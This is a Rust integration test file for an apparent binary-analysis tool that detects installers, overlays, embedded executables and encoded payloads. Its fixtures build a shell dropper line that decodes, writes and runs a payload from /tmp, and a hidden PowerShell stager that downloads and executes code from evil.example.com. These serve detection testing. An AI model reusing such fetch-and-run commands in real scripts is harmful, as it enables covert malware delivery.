//! Integration tests for embedded binary and SFX format detection.
//!
//! All tests use the CLI (`cleave analyze --format json`) to exercise the
//! full analysis pipeline. Library-level unit tests live within each module.
//!
//! Tests cover:
//! - NSIS / Inno Setup marker detection in PE files
//! - CAB overlay archive detection
//! - Embedded PE within PE (dropper pattern)
//! - Embedded ELF scanning
//! - Base64-encoded binary payloads in shell scripts
//! - PowerShell -EncodedCommand payloads
//! - False-positive regression on clean test binaries
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::fs;
use tempfile::TempDir;

// ── Fixture builders ───────────────────────────────────────────────────────────

/// Minimal PE stub (~512 bytes): valid MZ + PE\0\0 headers, no real code.
fn minimal_pe_stub() -> Vec<u8> {
    let mut buf = vec![0u8; 512];
    buf[0] = 0x4D; // M
    buf[1] = 0x5A; // Z
    buf[0x3C..0x40].copy_from_slice(&0x40u32.to_le_bytes()); // e_lfanew = 64
    let pe = 0x40usize;
    buf[pe] = 0x50; // P
    buf[pe + 1] = 0x45; // E
    buf[pe + 4..pe + 6].copy_from_slice(&0x014Cu16.to_le_bytes()); // Machine: i386
    buf[pe + 6..pe + 8].copy_from_slice(&1u16.to_le_bytes()); // NumberOfSections: 1
    buf[pe + 24..pe + 26].copy_from_slice(&0x010Bu16.to_le_bytes()); // PE32 magic
    buf[pe + 80..pe + 84].copy_from_slice(&4096u32.to_le_bytes()); // SizeOfImage
    buf
}

/// Embed a valid PE32 header at `offset` within `buf`.
fn embed_pe_at(buf: &mut Vec<u8>, offset: usize) {
    while buf.len() < offset + 4096 {
        buf.push(0u8);
    }
    buf[offset] = 0x4D;
    buf[offset + 1] = 0x5A;
    buf[offset + 0x3C..offset + 0x40].copy_from_slice(&0x40u32.to_le_bytes());
    let pe = offset + 0x40;
    buf[pe] = 0x50;
    buf[pe + 1] = 0x45;
    buf[pe + 4..pe + 6].copy_from_slice(&0x014Cu16.to_le_bytes()); // x86
    buf[pe + 6..pe + 8].copy_from_slice(&2u16.to_le_bytes()); // 2 sections
    buf[pe + 24..pe + 26].copy_from_slice(&0x010Bu16.to_le_bytes()); // PE32
    buf[pe + 80..pe + 84].copy_from_slice(&8192u32.to_le_bytes()); // SizeOfImage
}

/// Embed a valid ELF64 LE header at `offset` within `buf`.
fn embed_elf_at(buf: &mut Vec<u8>, offset: usize) {
    while buf.len() < offset + 64 {
        buf.push(0u8);
    }
    buf[offset] = 0x7F;
    buf[offset + 1] = 0x45; // E
    buf[offset + 2] = 0x4C; // L
    buf[offset + 3] = 0x46; // F
    buf[offset + 4] = 2; // EI_CLASS: 64-bit
    buf[offset + 5] = 1; // EI_DATA: LE
    buf[offset + 6] = 1; // EI_VERSION: 1
    buf[offset + 16..offset + 18].copy_from_slice(&2u16.to_le_bytes()); // ET_EXEC
    buf[offset + 18..offset + 20].copy_from_slice(&0x3Eu16.to_le_bytes()); // EM_X86_64
}

// ── NSIS / Inno Setup detection ───────────────────────────────────────────────

#[test]
fn test_nsis_marker_detected() {
    let tmp = TempDir::new().unwrap();
    let mut pe = minimal_pe_stub();
    pe.extend_from_slice(&[0xEF, 0xBE, 0xAD, 0xDE]); // NSIS deadbeef marker
    pe.extend_from_slice(&[0u8; 60]);
    let path = tmp.path().join("nsis.exe");
    fs::write(&path, &pe).unwrap();

    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .args(["--format", "json", "analyze", path.to_str().unwrap()])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("file/sfx/nsis"),
        "Expected 'file/sfx/nsis' in output.\nFirst 2000 chars:\n{}",
        &stdout[..stdout.len().min(2000)]
    );
}

#[test]
fn test_inno_setup_marker_detected() {
    let tmp = TempDir::new().unwrap();
    let mut pe = minimal_pe_stub();
    pe.extend_from_slice(b"Inno Setup Setup Data");
    pe.extend_from_slice(&[0u8; 60]);
    let path = tmp.path().join("inno.exe");
    fs::write(&path, &pe).unwrap();

    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .args(["--format", "json", "analyze", path.to_str().unwrap()])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("file/sfx/inno-setup"),
        "Expected 'file/sfx/inno-setup' in output.\nFirst 2000 chars:\n{}",
        &stdout[..stdout.len().min(2000)]
    );
}

// ── CAB overlay ───────────────────────────────────────────────────────────────

#[test]
fn test_cab_overlay_detected() {
    let tmp = TempDir::new().unwrap();
    // Use the real test.exe so goblin can parse sections and sections_end > 0
    let mut host = fs::read("tests/fixtures/test.exe").unwrap();
    // CAB (MSCF) appended after the PE as overlay
    host.extend_from_slice(&[0x4D, 0x53, 0x43, 0x46]); // MSCF magic
    host.extend_from_slice(&[0u8; 20]);
    let path = tmp.path().join("sfx.exe");
    fs::write(&path, &host).unwrap();

    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .args(["--format", "json", "analyze", path.to_str().unwrap()])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("self-extracting/cab"),
        "Expected 'self-extracting/cab' in output.\nFirst 2000 chars:\n{}",
        &stdout[..stdout.len().min(2000)]
    );
}

// ── Embedded PE / ELF scanning ────────────────────────────────────────────────

#[test]
fn test_embedded_pe_in_pe_detected() {
    let tmp = TempDir::new().unwrap();
    let mut host = minimal_pe_stub();
    embed_pe_at(&mut host, 512);
    let path = tmp.path().join("dropper.exe");
    fs::write(&path, &host).unwrap();

    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .args(["--format", "json", "analyze", path.to_str().unwrap()])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("binary/embedded/pe"),
        "Expected 'binary/embedded/pe' in output.\nFirst 2000 chars:\n{}",
        &stdout[..stdout.len().min(2000)]
    );
}

#[test]
fn test_embedded_elf_in_elf_detected() {
    let tmp = TempDir::new().unwrap();
    // Real ELF host with synthetic ELF appended after it
    let mut host = fs::read("tests/fixtures/test.elf").unwrap();
    let embed_at = host.len() + 16;
    host.resize(embed_at, 0u8);
    embed_elf_at(&mut host, embed_at);

    let path = tmp.path().join("elf_dropper.elf");
    fs::write(&path, &host).unwrap();

    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .args(["--format", "json", "analyze", path.to_str().unwrap()])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("binary/embedded/elf"),
        "Expected 'binary/embedded/elf' in output.\nFirst 2000 chars:\n{}",
        &stdout[..stdout.len().min(2000)]
    );
}

// ── Base64 binary payloads ────────────────────────────────────────────────────

#[test]
fn test_shell_script_base64_gzip_detected() {
    use base64::Engine;

    let tmp = TempDir::new().unwrap();
    // 75 bytes → 100 base64 chars (>= MIN_BASE64_LEN)
    let mut payload = vec![0x1Fu8, 0x8B, 0x08, 0x00]; // gzip magic + CM + FLG
    payload.resize(75, 0u8);
    let encoded = base64::engine::general_purpose::STANDARD.encode(&payload);

    let script = format!(
        "#!/bin/sh\n# dropper\np=\"{}\"\necho \"$p\" | base64 -d | gunzip > /tmp/.x && chmod +x /tmp/.x && /tmp/.x\n",
        encoded
    );
    let path = tmp.path().join("dropper.sh");
    fs::write(&path, &script).unwrap();

    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .args(["--format", "json", "analyze", path.to_str().unwrap()])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("base64-gz"),
        "Expected 'base64-gz' in output.\nFirst 3000 chars:\n{}",
        &stdout[..stdout.len().min(3000)]
    );
}

// ── PowerShell -EncodedCommand ────────────────────────────────────────────────

#[test]
fn test_powershell_encoded_command_detected() {
    use base64::Engine;

    let tmp = TempDir::new().unwrap();
    let ps_code =
        "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
    let utf16le: Vec<u8> = ps_code.encode_utf16().flat_map(u16::to_le_bytes).collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16le);

    let script = format!(
        "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {}\n",
        b64
    );
    let path = tmp.path().join("stager.ps1");
    fs::write(&path, &script).unwrap();

    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .args(["--format", "json", "analyze", path.to_str().unwrap()])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("base64-powershell"),
        "Expected 'base64-powershell' in output.\nFirst 3000 chars:\n{}",
        &stdout[..stdout.len().min(3000)]
    );
}

// ── False-positive regression ─────────────────────────────────────────────────

/// The real test.exe fixture must not produce embedded PE findings.
#[test]
fn test_no_false_positive_embedded_pe_on_clean_exe() {
    let tmp = TempDir::new().unwrap();
    let path = tmp.path().join("clean.exe");
    fs::copy("tests/fixtures/test.exe", &path).unwrap();

    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .args(["--format", "json", "analyze", path.to_str().unwrap()])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    let count = stdout.matches("binary/embedded/pe").count();
    assert!(
        count == 0,
        "False positive: {count} 'binary/embedded/pe' findings on clean test.exe"
    );
}

/// The real test.elf fixture must not produce embedded ELF findings.
#[test]
fn test_no_false_positive_embedded_elf_on_clean_elf() {
    let tmp = TempDir::new().unwrap();
    let path = tmp.path().join("clean.elf");
    fs::copy("tests/fixtures/test.elf", &path).unwrap();

    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .args(["--format", "json", "analyze", path.to_str().unwrap()])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    let count = stdout.matches("binary/embedded/elf").count();
    assert!(
        count == 0,
        "False positive: {count} 'binary/embedded/elf' findings on clean test.elf"
    );
}

/// Benign deploy scripts with short base64 must not produce base64-binary findings.
#[test]
fn test_no_false_positive_short_base64_in_benign_script() {
    let tmp = TempDir::new().unwrap();
    let script = r#"#!/bin/bash
# Deploy script
echo "Starting deployment..."
CONFIG=$(echo "dGVzdA==" | base64 -d)
echo "Config: $CONFIG"
curl -s https://api.example.com/deploy
echo "Done"
"#;
    let path = tmp.path().join("deploy.sh");
    fs::write(&path, script).unwrap();

    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .args(["--format", "json", "analyze", path.to_str().unwrap()])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("base64-gz")
            && !stdout.contains("base64-pe")
            && !stdout.contains("base64-elf"),
        "False positive: base64-binary finding on benign deploy script.\nFirst 2000 chars:\n{}",
        &stdout[..stdout.len().min(2000)]
    );
}
